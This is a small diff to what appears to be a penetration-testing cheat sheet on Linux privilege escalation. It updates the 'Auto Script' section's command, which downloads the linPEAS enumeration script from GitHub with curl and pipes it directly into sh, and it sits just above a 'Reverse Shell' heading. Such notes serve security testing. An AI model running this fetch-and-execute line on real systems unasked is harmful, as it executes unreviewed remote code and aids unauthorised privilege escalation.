@@ -16,7 +16,7 @@ sudo -l
 
 ## Auto Script
 ```
-curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
 ## Reverse Shell
